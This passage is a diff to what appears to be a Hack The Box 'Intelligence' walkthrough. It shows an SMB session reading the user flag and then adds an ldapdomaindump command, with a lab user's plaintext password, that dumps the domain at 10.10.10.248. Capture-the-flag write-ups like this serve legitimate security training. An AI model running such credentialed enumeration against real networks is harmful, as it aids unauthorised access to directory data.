@@ -344,3 +344,13 @@ smb: \Tiffany.Molina\Desktop\> more user.txt
 getting file \Tiffany.Molina\Desktop\user.txt of size 34 as /tmp/smbmore.nA33pC (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 smb: \Tiffany.Molina\Desktop\> 
 ```
+
+```
+──(root💀kali)-[~/Downloads/hackthebox/inteligence/ldapdomaindump]
+└─# ldapdomaindump 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -o ldap_dump
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+```
